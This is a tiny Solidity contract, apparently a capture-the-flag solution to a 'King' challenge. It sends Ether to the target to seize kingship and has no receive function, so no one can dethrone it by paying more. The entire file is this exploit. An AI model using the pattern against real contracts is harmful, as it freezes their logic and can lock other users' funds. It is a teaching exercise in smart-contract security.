pragma solidity ^0.6.0;

contract KingSolve {
    function stealKingship(address payable _king) public payable {
        (bool sent, ) = _king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}